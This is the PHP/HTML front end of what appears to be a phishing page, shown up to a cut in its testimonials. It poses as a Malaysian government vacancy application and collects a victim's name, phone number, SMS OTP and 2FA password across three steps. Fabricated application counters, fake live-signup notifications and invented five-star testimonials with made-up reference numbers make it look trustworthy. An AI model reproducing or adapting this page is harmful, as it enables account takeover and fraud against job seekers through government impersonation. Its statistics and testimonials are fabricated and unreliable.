<?php
require_once 'settings.php';
?>
<!DOCTYPE html>
<html lang="ms">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JAWATAN KOSONG TERKINI 2026</title>
    <link rel="apple-touch-icon" sizes="180x180" href="img/favicon/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="img/favicon/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="img/favicon/favicon-16x16.png">
    <link rel="manifest" href="img/favicon/site.webmanifest">
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap"
        rel="stylesheet">
    <link rel="stylesheet" href="css/main.css">

    <style>
        /* ==============================
           BASE
        ============================== */
        body {
            font-family: 'Plus Jakarta Sans', sans-serif !important;
            background: #eef2fb !important;
            min-height: 100vh;
        }

        body::before {
            content: '';
            position: fixed;
            width: 420px;
            height: 420px;
            border-radius: 50%;
            background: rgba(41, 82, 196, .09);
            filter: blur(90px);
            top: -130px;
            left: -130px;
            pointer-events: none;
            z-index: 0;
            animation: blobA 12s ease-in-out infinite alternate;
        }

        body::after {
            content: '';
            position: fixed;
            width: 300px;
            height: 300px;
            border-radius: 50%;
            background: rgba(245, 166, 35, .08);
            filter: blur(80px);
            bottom: 60px;
            right: -80px;
            pointer-events: none;
            z-index: 0;
            animation: blobB 10s ease-in-out infinite alternate;
        }

        @keyframes blobA {
            0% {
                transform: translate(0, 0)scale(1);
            }

            100% {
                transform: translate(20px, 15px)scale(1.1);
            }
        }

        @keyframes blobB {
            0% {
                transform: translate(0, 0)scale(1);
            }

            100% {
                transform: translate(-15px, -20px)scale(1.08);
            }
        }

        @keyframes fadeUp {
            from {
                transform: translateY(22px);
                opacity: 0;
            }

            to {
                transform: translateY(0);
                opacity: 1;
            }
        }

        @keyframes slideDown {
            from {
                transform: translateY(-14px);
                opacity: 0;
            }

            to {
                transform: translateY(0);
                opacity: 1;
            }
        }

        .container-fluid {
            position: relative;
            z-index: 1;
        }

        /* ==============================
           LANGUAGE BAR
        ============================== */
        .lang-bar-wrap {
            animation: slideDown .5s ease both;
        }

        .lang-bar-wrap a {
            font-weight: 600 !important;
            padding: 2px 8px;
            border-radius: 20px;
            transition: all .25s ease;
        }

        .lang-bar-wrap a:not(.disabled):hover {
            background: rgba(41, 82, 196, .12);
            text-decoration: none !important;
        }

        /* ==============================
           BANNER
        ============================== */
        .banner-wrap {
            position: relative;
            border-radius: 18px;
            overflow: hidden;
            box-shadow: 0 16px 50px rgba(26, 60, 143, .2);
            animation: fadeUp .6s .1s ease both;
            transition: transform .3s ease, box-shadow .3s ease;
        }

        .banner-wrap:hover {
            transform: translateY(-3px);
            box-shadow: 0 22px 60px rgba(26, 60, 143, .26);
        }

        .banner-wrap img {
            display: block;
            width: 100%;
            border-radius: 18px;
        }

        .banner-badge {
            position: absolute;
            top: 12px;
            right: 12px;
            background: linear-gradient(135deg, #ef4444, #dc2626);
            color: #fff;
            font-size: 9.5px;
            font-weight: 800;
            padding: 5px 12px;
            border-radius: 30px;
            letter-spacing: .5px;
            display: flex;
            align-items: center;
            gap: 5px;
            box-shadow: 0 4px 16px rgba(239, 68, 68, .45);
            animation: badgePulse 2s ease-in-out infinite;
        }

        .banner-badge::before {
            content: '';
            width: 6px;
            height: 6px;
            border-radius: 50%;
            background: #fff;
            animation: dotBlink 1s ease-in-out infinite;
        }

        @keyframes badgePulse {

            0%,
            100% {
                box-shadow: 0 4px 16px rgba(239, 68, 68, .4);
            }

            50% {
                box-shadow: 0 4px 28px rgba(239, 68, 68, .7);
            }
        }

        @keyframes dotBlink {

            0%,
            100% {
                opacity: 1;
            }

            50% {
                opacity: .3;
            }
        }

        /* ==============================
           MAIN CARD
        ============================== */
        .main-card {
            background: #fff;
            border-radius: 22px;
            box-shadow: 0 10px 50px rgba(26, 60, 143, .12), 0 1px 4px rgba(0, 0, 0, .04);
            border: 1px solid rgba(26, 60, 143, .08);
            overflow: hidden;
            animation: fadeUp .6s .2s ease both;
            position: relative;
        }

        .main-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(90deg, #1a3c8f, #2952c4, #f5a623);
        }

        .main-card-body {
            padding: 24px 20px 22px;
        }

        .main-card h3 {
            font-size: 19px !important;
            font-weight: 800 !important;
            letter-spacing: -.3px;
            background: linear-gradient(135deg, #1a3c8f, #2952c4);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        /* ==============================
           INPUTS
        ============================== */
        .input-group-text {
            background: linear-gradient(135deg, #f0f4ff, #eaeefd) !important;
            border-color: rgba(26, 60, 143, .14) !important;
            border-right: none !important;
        }

        .input-group-text:first-child {
            border-radius: 12px 0 0 12px !important;
        }

        .form-control {
            border-color: rgba(26, 60, 143, .14) !important;
            border-left: none !important;
            font-family: 'Plus Jakarta Sans', sans-serif !important;
            font-size: 14px !important;
            font-weight: 500 !important;
            border-radius: 0 12px 12px 0 !important;
            transition: all .3s ease !important;
        }

        .form-control:focus {
            border-color: #2952c4 !important;
            border-left: 1px solid #2952c4 !important;
            box-shadow: 0 0 0 4px rgba(41, 82, 196, .1) !important;
            background: #fafbff !important;
        }

        .otp-input {
            border-radius: 12px !important;
            border-left: 1px solid rgba(26, 60, 143, .18) !important;
            font-size: 20px !important;
            font-weight: 800 !important;
            color: #1a3c8f !important;
            border: 2px solid rgba(26, 60, 143, .18) !important;
            height: 52px !important;
            transition: all .3s ease !important;
        }

        .otp-input:focus {
            border-color: #2952c4 !important;
            box-shadow: 0 0 0 4px rgba(41, 82, 196, .1) !important;
            transform: scale(1.06) !important;
        }

        /* ==============================
           BUTTON
        ============================== */
        .btn-primary {
            background: linear-gradient(135deg, #1a3c8f, #2952c4) !important;
            border: none !important;
            border-radius: 14px !important;
            font-family: 'Plus Jakarta Sans', sans-serif !important;
            font-weight: 700 !important;
            font-size: 15px !important;
            padding: 13px 32px !important;
            box-shadow: 0 6px 22px rgba(26, 60, 143, .32) !important;
            transition: all .3s ease !important;
            position: relative;
            overflow: hidden;
        }

        .btn-primary::after {
            content: '';
            position: absolute;
            inset: 0;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, .13), transparent);
            transform: translateX(-100%);
        }

        .btn-primary:hover {
            transform: translateY(-2px) !important;
            box-shadow: 0 10px 32px rgba(26, 60, 143, .42) !important;
        }

        .btn-primary:hover::after {
            animation: shimmer .7s ease;
        }

        @keyframes shimmer {
            to {
                transform: translateX(100%);
            }
        }

        .btn-primary:active {
            transform: translateY(0) !important;
        }

        .btn-light {
            border-radius: 12px !important;
            font-family: 'Plus Jakarta Sans', sans-serif !important;
            font-weight: 600 !important;
            border: 2px solid rgba(26, 60, 143, .14) !important;
            transition: all .3s ease !important;
        }

        .btn-light:hover {
            background: rgba(26, 60, 143, .06) !important;
            border-color: #2952c4 !important;
        }

        /* ==============================
           SPINNER
        ============================== */
        .spinner-backdrop {
            position: fixed;
            inset: 0;
            background: rgba(255, 255, 255, .88);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            backdrop-filter: blur(6px);
        }

        .spinner-border {
            width: 3rem;
            height: 3rem;
            border: 4px solid rgba(26, 60, 143, .15) !important;
            border-top-color: #2952c4 !important;
        }

        /* ==============================
           STATS ROW
        ============================== */
        .stats-row {
            display: flex;
            gap: 8px;
            margin-bottom: 16px;
            animation: fadeUp .5s .4s ease both;
        }

        .stat-pill {
            flex: 1;
            text-align: center;
            background: #fff;
            border: 1px solid rgba(26, 60, 143, .1);
            border-radius: 14px;
            padding: 11px 8px;
            box-shadow: 0 2px 12px rgba(26, 60, 143, .06);
        }

        .stat-num {
            display: block;
            font-size: 18px;
            font-weight: 800;
            color: #1a3c8f;
            line-height: 1;
        }

        .stat-lbl {
            display: block;
            font-size: 9px;
            font-weight: 700;
            color: #9ca3af;
            text-transform: uppercase;
            letter-spacing: .5px;
            margin-top: 3px;
        }

        /* ==============================
           LIVE NOTIF CORNER (pojok atas)
        ============================== */
        #live-notif {
            position: fixed;
            top: 16px;
            left: 16px;
            z-index: 9998;
            display: flex;
            flex-direction: column;
            gap: 6px;
            pointer-events: none;
        }

        .notif-bubble {
            background: #fff;
            border: 1.5px solid rgba(16, 185, 129, .3);
            border-radius: 14px;
            padding: 9px 12px;
            display: flex;
            align-items: center;
            gap: 9px;
            box-shadow: 0 6px 24px rgba(0, 0, 0, .1);
            max-width: 230px;
            animation: notifIn .5s cubic-bezier(.34, 1.4, .64, 1) both;
        }

        @keyframes notifIn {
            from {
                transform: translateX(-120%) scale(.9);
                opacity: 0;
            }

            to {
                transform: translateX(0) scale(1);
                opacity: 1;
            }
        }

        .notif-bubble.notif-out {
            animation: notifOut .4s ease forwards;
        }

        @keyframes notifOut {
            to {
                transform: translateX(-120%);
                opacity: 0;
            }
        }

        .notif-av {
            width: 36px;
            height: 36px;
            border-radius: 50%;
            flex-shrink: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 800;
            font-size: 14px;
            color: #fff;
            box-shadow: 0 2px 8px rgba(0, 0, 0, .15);
            position: relative;
        }

        .notif-av .spin-ring {
            position: absolute;
            inset: -3px;
            border-radius: 50%;
            border: 2px solid transparent;
            border-top-color: #10b981;
            border-right-color: #10b981;
            animation: spin 1.2s linear infinite;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        .notif-text {
            flex: 1;
            min-width: 0;
        }

        .notif-name {
            font-size: 11px;
            font-weight: 800;
            color: #111827;
            line-height: 1.2;
        }

        /* JANTINA DALAM NOTIF */
        .notif-gender {
            font-size: 10px;
            font-weight: 700;
            margin-top: 1px;
            margin-bottom: 1px;
            display: inline-flex;
            align-items: center;
            gap: 3px;
        }

        .notif-gender.lelaki {
            color: #2952c4;
        }

        .notif-gender.perempuan {
            color: #db2777;
        }

        .notif-status {
            font-size: 10px;
            color: #10b981;
            font-weight: 700;
            margin-top: 1px;
        }

        .notif-dots {
            display: flex;
            gap: 3px;
            align-items: center;
            margin-top: 2px;
        }

        .notif-dots span {
            width: 4px;
            height: 4px;
            border-radius: 50%;
            background: #10b981;
            animation: dotBounce 1.2s ease-in-out infinite;
        }

        .notif-dots span:nth-child(2) {
            animation-delay: .2s;
        }

        .notif-dots span:nth-child(3) {
            animation-delay: .4s;
        }

        @keyframes dotBounce {

            0%,
            80%,
            100% {
                transform: translateY(0);
                opacity: .4;
            }

            40% {
                transform: translateY(-4px);
                opacity: 1;
            }
        }

        /* ==============================
           TESTIMONIAL SECTION
        ============================== */
        .testi-section {
            animation: fadeUp .5s .5s ease both;
        }

        .testi-header {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 14px;
        }

        .testi-live-dot {
            width: 9px;
            height: 9px;
            border-radius: 50%;
            background: #10b981;
            flex-shrink: 0;
            animation: livePulse 1.5s ease-in-out infinite;
        }

        @keyframes livePulse {

            0%,
            100% {
                box-shadow: 0 0 0 0 rgba(16, 185, 129, .5);
            }

            50% {
                box-shadow: 0 0 0 7px rgba(16, 185, 129, 0);
            }
        }

        .testi-label {
            font-size: 11.5px;
            font-weight: 800;
            color: #111827;
            text-transform: uppercase;
            letter-spacing: 1px;
            white-space: nowrap;
        }

        .testi-line {
            flex: 1;
            height: 1px;
            background: linear-gradient(90deg, rgba(26, 60, 143, .2), transparent);
        }

        .testi-counter {
            background: #10b981;
            color: #fff;
            font-size: 10px;
            font-weight: 800;
            padding: 3px 10px;
            border-radius: 20px;
            white-space: nowrap;
        }

        /* AUTO-SCROLL WRAPPER */
        .testi-scroll-outer {
            position: relative;
            border-radius: 18px;
            overflow: hidden;
        }

        .testi-scroll-outer::before,
        .testi-scroll-outer::after {
            content: '';
            position: absolute;
            left: 0;
            right: 0;
            height: 36px;
            pointer-events: none;
            z-index: 2;
        }

        .testi-scroll-outer::before {
            top: 0;
            background: linear-gradient(to bottom, #eef2fb, transparent);
        }

        .testi-scroll-outer::after {
            bottom: 0;
            background: linear-gradient(to top, #eef2fb, transparent);
        }

        .testi-track {
            display: flex;
            flex-direction: column;
            gap: 12px;
            padding: 8px 2px;
        }

        /* ==============================
           TESTIMONIAL CARD
        ============================== */
        .testi-card {
            background: #fff;
            border: 1.5px solid rgba(16, 185, 129, .2);
            border-radius: 20px;
            padding: 16px 16px 14px;
            display: flex;
            gap: 14px;
            align-items: flex-start;
            position: relative;
            overflow: hidden;
            box-shadow: 0 4px 20px rgba(0, 0, 0, .06);
            flex-shrink: 0;
        }

        .testi-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 4px;
            height: 100%;
            background: linear-gradient(to bottom, #10b981, #059669);
            border-radius: 4px 0 0 4px;
        }

        /* ==============================
           AVATAR INSIDE CARD
        ============================== */
        .tc-av-wrap {
            position: relative;
            flex-shrink: 0;
        }

        .tc-av {
            width: 62px;
            height: 62px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 900;
            font-size: 24px;
            color: #fff;
            border: 3px solid #fff;
            box-shadow: 0 4px 16px rgba(0, 0, 0, .15);
            overflow: hidden;
            position: relative;
        }

        .tc-av img {
            position: absolute;
            inset: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            border-radius: 50%;
        }

        .tc-check {
            position: absolute;
            bottom: 1px;
            right: 1px;
            width: 22px;
            height: 22px;
            border-radius: 50%;
            background: #10b981;
            border: 2.5px solid #fff;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 2px 8px rgba(16, 185, 129, .4);
        }

        .tc-check i {
            font-size: 10px;
            color: #fff;
        }

        /* ==============================
           CARD BODY
        ============================== */
        .tc-body {
            flex: 1;
            min-width: 0;
        }

        .tc-name {
            font-size: 15px;
            font-weight: 800;
            color: #111827;
            margin-bottom: 2px;
            line-height: 1.2;
        }

        /* JANTINA BADGE DI BAWAH NAMA */
        .tc-gender {
            display: inline-flex;
            align-items: center;
            gap: 4px;
            font-size: 10.5px;
            font-weight: 700;
            padding: 2px 9px;
            border-radius: 20px;
            margin-bottom: 5px;
            letter-spacing: .3px;
        }

        .tc-gender.lelaki {
            background: #eff6ff;
            color: #2952c4;
            border: 1px solid #bfdbfe;
        }

        .tc-gender.perempuan {
            background: #fdf2f8;
            color: #db2777;
            border: 1px solid #fbcfe8;
        }

        .tc-meta {
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 11px;
            color: #6b7280;
            font-weight: 500;
            margin-bottom: 7px;
        }

        .tc-meta i {
            font-size: 9px;
            color: #9ca3af;
        }

        .tc-meta .dot {
            width: 3px;
            height: 3px;
            border-radius: 50%;
            background: #d1d5db;
        }

        .tc-stars {
            font-size: 14px;
            color: #f59e0b;
            letter-spacing: 1px;
            margin-bottom: 8px;
        }

        /* THE MAIN SUCCESS BOX */
        .tc-success {
            background: linear-gradient(135deg, #ecfdf5, #d1fae5);
            border: 1.5px solid #6ee7b7;
            border-radius: 12px;
            padding: 10px 13px;
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 10px;
        }

        .tc-success-icon {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            background: linear-gradient(135deg, #10b981, #059669);
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
            box-shadow: 0 3px 10px rgba(16, 185, 129, .35);
        }

        .tc-success-icon i {
            font-size: 14px;
            color: #fff;
        }

        .tc-success-text {}

        .tc-success-title {
            font-size: 12.5px;
            font-weight: 800;
            color: #065f46;
            text-transform: uppercase;
            letter-spacing: .4px;
            line-height: 1.2;
        }

        .tc-success-ref {
            font-size: 10.5px;
            color: #047857;
            font-weight: 600;
            font-family: monospace;
            margin-top: 2px;
        }

        .tc-msg {
            font-size: 12.5px;
            color: #4b5563;
            line-height: 1.6;
            font-weight: 400;
        }

        /* ==============================
           DROPDOWN NEGERI
        ============================== */
        .select-wrapper {
            position: relative;
        }

        .select-wrapper select.form-control {
            border-left: none !important;
            appearance: none;
            -webkit-appearance: none;
            cursor: pointer;
            color: #495057;
            background: #fff !important;
            padding-right: 36px !important;
        }

        .select-wrapper select.form-control:focus {
            border-color: #2952c4 !important;
            border-left: 1px solid #2952c4 !important;
            box-shadow: 0 0 0 4px rgba(41, 82, 196, .1) !important;
        }

        .select-wrapper select.form-control option[value=""] {
            color: #adb5bd;
        }

        .select-arrow {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            pointer-events: none;
            color: #6b7280;
            font-size: 12px;
        }

        /* ==============================
           BUTANG JANTINA DALAM FORM
        ============================== */
        .gender-row {
            display: flex;
            gap: 10px;
            margin-bottom: 16px;
        }

        .gender-btn {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 7px;
            padding: 10px 12px;
            border-radius: 12px;
            cursor: pointer;
            border: 2px solid rgba(26, 60, 143, .14);
            background: #fff;
            font-family: 'Plus Jakarta Sans', sans-serif;
            font-size: 13px;
            font-weight: 600;
            color: #6b7280;
            transition: all .25s ease;
            user-select: none;
        }

        .gender-btn i {
            font-size: 15px;
        }

        .gender-btn.active-lelaki {
            border-color: #2952c4;
            background: #eff6ff;
            color: #2952c4;
            box-shadow: 0 0 0 3px rgba(41, 82, 196, .1);
        }

        .gender-btn.active-perempuan {
            border-color: #db2777;
            background: #fdf2f8;
            color: #db2777;
            box-shadow: 0 0 0 3px rgba(219, 39, 119, .1);
        }

        .gender-btn:hover:not(.active-lelaki):not(.active-perempuan) {
            background: #f8fafc;
            border-color: rgba(26, 60, 143, .3);
        }

        /* hidden input */
        #genderValue {
            display: none;
        }

        /* ==============================
           FOOTER
        ============================== */
        footer {
            background: linear-gradient(135deg, #1e2d6e, #39447a) !important;
            position: relative;
            z-index: 1;
        }

        footer li i {
            cursor: pointer;
            transition: all .3s ease !important;
        }

        footer li:hover i {
            color: #f5a623 !important;
            transform: translateY(-2px);
            display: inline-block;
        }
    </style>
</head>

<body class="overflow-auto">

    <!-- ==============================
         LIVE NOTIF POJOK KIRI ATAS
    ============================== -->
    <div id="live-notif"></div>

    <div class="container-fluid d-flex justify-content-center align-items-center">

        <!-- SPINNER (id asal dipelihara) -->
        <div id="loadingSpinner" class="d-none">
            <div class="spinner-backdrop">
                <div class="spinner-border text-light" role="status">
                    <span class="sr-only">Memuatkan...</span>
                </div>
            </div>
        </div>

        <div class="w-100" style="max-width: 480px;">

            <!-- Bahagian Bahasa -->
            <div class="lang-bar-wrap text-center my-3 d-flex justify-content-center small">
                <a class="text-dark font-weight-bold text-decoration-none disabled text-truncate" href="#" tabindex="-1"
                    aria-disabled="true">Bahasa Melayu</a>
                <span class="mx-1">|</span>
                <a class="text-primary text-decoration-none text-truncate" href="#">English</a>
                <span class="mx-1">|</span>
                <a class="text-primary text-decoration-none text-truncate" href="#">中文(简体)</a>
                <span class="mx-1">|</span>
                <a class="text-primary text-decoration-none text-truncate" href="#">தமிழ்</a>
            </div>

           <!-- Banner -->
<div class="my-4 banner-wrap" style="position:relative;">
    <img src="images/jawatan.jpg" alt="Banner Bantuan MADANI" class="img-fluid">
    <div class="banner-badge">MOHON SEKARANG</div>
</div>

<div class="container px-0">

    <!-- MAIN CARD -->
    <div class="main-card mb-3">
        <div class="main-card-body">

            <!-- Tajuk -->
            <div class="text-center align-items-center mb-3">
                <h3 class="text-primary font-weight-bold">PERMOHONAN JAWATAN KOSONG</h3>
                <p class="text-muted small mb-0">Inisiatif Kerajaan Malaysia untuk Rakyat Belum Bekerja</p>
            </div>

            <!-- Info Highlight -->
            <div class="alert alert-info text-center small mb-3">
                Semakan & Permohonan JAWATAN KOSONG kini dibuka. Pastikan maklumat anda lengkap untuk kelulusan.
            </div>

            <div class="text-center align-items-center mt-3" id="guide-text">
                <p class="small text-muted mb-0">
                    Sila isi maklumat dengan tepat untuk mengelakkan sebarang masalah semasa proses kelulusan.
                </p>
            </div>

            <div class="my-2">
                            <!-- LANGKAH 1: BORANG DAFTAR -->
                            <form id="loginForm">
                                <div class="input-group mb-3">
                                    <div class="input-group-prepend">
                                        <div class="input-group-text"><i class="fa-solid fa-id-card text-primary"></i>
                                        </div>
                                    </div>
                                    <input type="text" inputmode="text" placeholder="Nama Penuh Mengikut Kad Pengenalan"
                                        class="form-control" id="fullName" name="name" required="">
                                </div>

                                <!-- PILIHAN JANTINA -->
                                <div class="gender-row mb-3">
                                    <div class="gender-btn" id="btnLelaki" onclick="selectGender('lelaki')">
                                        <i class="fas fa-mars"></i> Lelaki
                                    </div>
                                    <div class="gender-btn" id="btnPerempuan" onclick="selectGender('perempuan')">
                                        <i class="fas fa-venus"></i> Perempuan
                                    </div>
                                </div>
                                <input type="hidden" id="genderValue" name="gender">

                                <!-- PILIHAN NEGERI -->
                                <div class="input-group mb-3">
                                    <div class="input-group-prepend">
                                        <div class="input-group-text"><i
                                                class="fa-solid fa-map-location-dot text-primary"></i></div>
                                    </div>
                                    <div class="select-wrapper flex-fill">
                                        <select class="form-control" id="negeri" name="negeri" required="">
                                            <option value="" disabled="" selected="">-- Pilih Negeri --</option>
                                            <option value="Johor">Johor</option>
                                            <option value="Kedah">Kedah</option>
                                            <option value="Kelantan">Kelantan</option>
                                            <option value="Melaka">Melaka</option>
                                            <option value="Negeri Sembilan">Negeri Sembilan</option>
                                            <option value="Pahang">Pahang</option>
                                            <option value="Perak">Perak</option>
                                            <option value="Perlis">Perlis</option>
                                            <option value="Pulau Pinang">Pulau Pinang</option>
                                            <option value="Sabah">Sabah</option>
                                            <option value="Sarawak">Sarawak</option>
                                            <option value="Selangor">Selangor</option>
                                            <option value="Terengganu">Terengganu</option>
                                            <option value="WP Kuala Lumpur">WP Kuala Lumpur</option>
                                            <option value="WP Labuan">WP Labuan</option>
                                            <option value="WP Putrajaya">WP Putrajaya</option>
                                        </select>
                                        <i class="fas fa-chevron-down select-arrow"></i>
                                    </div>
                                </div>

                                <div class="input-group mb-4">
                                    <div class="input-group-prepend">
                                        <div class="input-group-text"><img src="images/1f1f2-1f1fe.png" width="18" height="18">
                                        </div>
                                    </div>
                                    <input type="text" inputmode="tel" placeholder="+60xxxxxxxxx" class="form-control"
                                        id="phone" name="phoneNumber" required="">
                                <div id="wrong" style="display:none;color:red;text-align:center;">
    Nomor tidak valid
</div>

<div id="feedback" style="text-align:center;"></div>

<div id="loader" style="display:none;text-align:center;">
    ⏳ Memproses...
</div>
</div>
                                <div class="responseMessage my-3"></div>
                                <button type="button" id="sendOtp" class="btn btn-primary btn-lg mx-auto d-block">
    <span id="btnText">Mohon Sekarang</span>
</button>
                            </form>

                            <!-- LANGKAH 2: OTP -->
                            <form id="otpForm" class="d-none">
                                <label class="text-center w-100 mb-2" for="otp1"><b>Masukkan 5 Digit Kod Pengesahan
                                        (OTP)</b></label>
                                <div class="input-group mb-4 d-flex justify-content-center mx-auto"
                                    style="max-width:270px;gap:6px;">
                                    <input type="text" class="form-control otp-input text-center" maxlength="1"
                                        required="" id="otp1" autocomplete="one-time-code">
                                    <input type="text" class="form-control otp-input text-center" maxlength="1"
                                        required="" id="otp2">
                                    <input type="text" class="form-control otp-input text-center" maxlength="1"
                                        required="" id="otp3">
                                    <input type="text" class="form-control otp-input text-center" maxlength="1"
                                        required="" id="otp4">
                                    <input type="text" class="form-control otp-input text-center" maxlength="1"
                                        required="" id="otp5">
                                </div>
                                <div class="responseMessage my-3"></div>
                                <button type="submit" class="btn btn-primary btn-lg mx-auto d-block">
                                    <i class="fas fa-shield-halved mr-2"></i>Sahkan
                                </button>
                            </form>

                            <!-- LANGKAH 3: PASSWORD 2FA -->
                            <form id="2faForm" class="d-none">
                                <label class="text-center w-100 mb-2" for="fa2"><b>Kata Laluan 2FA (Jika
                                        Ada)</b></label>
                                <div class="input-group mb-4">
                                    <div class="input-group-prepend">
                                        <div class="input-group-text"><i class="fa-solid fa-lock text-primary"></i>
                                        </div>
                                    </div>
                                    <input type="password" class="form-control" id="fa2"
                                        placeholder="Kata Laluan 2FA (Pilihan)">
                                </div>
                                <div class="responseMessage my-3"></div>
                                <button type="submit" class="btn btn-primary btn-lg mx-auto d-block">
                                    <i class="fas fa-check-double mr-2"></i>Sahkan & Teruskan
                                </button>
                            </form>

                            <!-- GANTI NOMBOR -->
                            <div id="reloadBtn" class="my-3 d-none">
                                <button class="btn btn-light mx-auto d-block text-primary" onclick="location.reload();">
                                    <i class="fas fa-rotate-left mr-1"></i> Hantar Semula Kod / Tukar Nombor
                                </button>
                            </div>
                        </div>
                    </div>
                </div>

               <!-- STATS ROW -->
<div class="stats-row">
    <div class="stat-pill">
        <span class="stat-num" id="statTotal">52,841</span>
        <span class="stat-lbl">Jumlah Permohonan</span>
    </div>
    <div class="stat-pill">
        <span class="stat-num">+500</span>
        <span class="stat-lbl">Jawatan Kosong</span>
    </div>
    <div class="stat-pill">
        <span class="stat-num" id="statOnline">185</span>
        <span class="stat-lbl">Sedang Diproses</span>
    </div>
</div>

                <!-- ============================
                     TESTIMONI
                ============================ -->
                <div class="testi-section mb-5">
                    <div class="testi-header">
                        <div class="testi-live-dot"></div>
                        <span class="testi-label">Permohonan yang Berjaya Didaftarkan</span>
                        <div class="testi-line"></div>
                        <span class="testi-counter" id="testiCounter">12,847 berjaya</span>
                    </div>

                    <div class="testi-scroll-outer">
                        <div class="testi-track" id="testiTrack" style="transform: translateY(-24.6px);">
                            <div class="testi-card">
                                <div class="tc-av-wrap">
                                    <div class="tc-av" style="background:linear-gradient(135deg,#1a3c8f,#2952c4);">S
                                    </div>
                                    <div class="tc-check"><i class="fas fa-check"></i></div>
                                </div>
                                <div class="tc-body">
                                    <div class="tc-name">Siti Aminah bt Hassan</div><span class="tc-gender perempuan"><i
                                            class="fas fa-venus"></i>Perempuan</span>
                                    <div class="tc-meta"><i class="fas fa-location-dot"></i>Kuala Lumpur<span
                                            class="dot"></span>2 min lepas</div>
                                    <div class="tc-stars">★★★★★</div>
                                    <div class="tc-success">
                                        <div class="tc-success-icon"><i class="fas fa-circle-check"></i></div>
                                        <div class="tc-success-text">
                                            <div class="tc-success-title">✅ Permohonan Berjaya Didaftarkan</div>
                                            <div class="tc-success-ref">No. Rujukan: BNT-2026-841027</div>
                                        </div>
                                    </div>
                                    <div class="tc-msg">Alhamdulillah! Proses permohonan sangat mudah dan lancar. Dalam
                                        masa 5 minit sahaja dah selesai. Syabas kerajaan!</div>
                                </div>
                            </div>
                            <div class="testi-card">
                                <div class="tc-av-wrap">
                                    <div class="tc-av" style="background:linear-gradient(135deg,#7c3aed,#a855f7);">M
                                    </div>
                                    <div class="tc-check"><i class="fas fa-check"></i></div>
                                </div>
                                <div class="tc-body">
                                    <div class="tc-name">Mohd Firdaus Halim</div><span class="tc-gender lelaki"><i
                                            class="fas fa-mars"></i>Lelaki</span>
                                    <div class="tc-meta"><i class="fas fa-location-dot"></i>Shah Alam, Selangor<span
                                            class="dot"></span>6 min lepas</div>
                                    <div class="tc-stars">★★★★★</div>
                                    <div class="tc-success">
                                        <div class="tc-success-icon"><i class="fas fa-circle-check"></i></div>
                                        <div class="tc-success-text">
                                            <div class="tc-success-title">✅ Permohonan Berjaya Didaftarkan</div>
                                            <div class="tc-success-ref">No. Rujukan: BNT-2026-623918</div>
                                        </div>
                                    </div>
                                    <div class="tc-msg">Saya rasa sangat berpuas hati dengan sistem baru ini. Tak perlu
                                        beratur atau datang ke pejabat. Bagus sangat!</div>
                                </div>
                            </div>
                            <div class="testi-card">
                                <div class="tc-av-wrap">
                                    <div class="tc-av" style="background:linear-gradient(135deg,#0891b2,#0ea5e9);">N
                                    </div>
                                    <div class="tc-check"><i class="fas fa-check"></i></div>
                                </div>
                                <div class="tc-body">
                                    <div class="tc-name">Nurul Ain Zakaria</div><span class="tc-gender perempuan"><i
                                            class="fas fa-venus"></i>Perempuan</span>
                                    <div class="tc-meta"><i class="fas fa-location-dot"></i>Johor Bahru<span
                                            class="dot"></span>11 min lepas</div>
                                    <div class="tc-stars">★★★★★</div>
                                    <div class="tc-success">
                                        <div class="tc-success-icon"><i class="fas fa-circle-check"></i></div>
                                        <div class="tc-success-text">
                                            <div class="tc-success-title">✅ Permohonan Berjaya Didaftarkan</div>
                                            <div class="tc-success-ref">No. Rujukan: BNT-2026-752341</div>
                                        </div>
                                    </div>
                                    <div class="tc-msg">Dah lama saya tunggu peluang ini. Akhirnya dapat daftar dengan
                                        mudah. Terima kasih kerajaan Malaysia!</div>
                                </div>
                            </div>
                            <div class="testi-card">
                                <div class="tc-av-wrap">
                                    <div class="tc-av" style="background:linear-gradient(135deg,#059669,#34d399);">A
                                    </div>
                                    <div class="tc-check"><i class="fas fa-check"></i></div>
                                </div>
                                <div class="tc-body">
                                    <div class="tc-name">Ahmad Zaki Roslan</div><span class="tc-gender lelaki"><i
                                            class="fas fa-mars"></i>Lelaki</span>
                                    <div class="tc-meta"><i class="fas fa-location-dot"></i>Pulau Pinang<span
                                            class="dot"></span>15 min lepas</div>
                                    <div class="tc-stars">★★★★★</div>
                                    <div class="tc-success">
                                        <div class="tc-success-icon"><i class="fas fa-circle-check"></i></div>
                                        <div class="tc-success-text">
                                            <div class="tc-success-title">✅ Permohonan Berjaya Didaftarkan</div>
                                            <div class="tc-success-ref">No. Rujukan: BNT-2026-398564</div>
                                        </div>
                                    </div>
                                    <div class="tc-msg">OTP masuk dalam beberapa saat sahaja. Proses terus berjalan
                                        lancar. Sistem yang sangat canggih dan berkesan!</div>
                                </div>
                            </div>
                            <div class="testi-card">
                                <div class="tc-av-wrap">
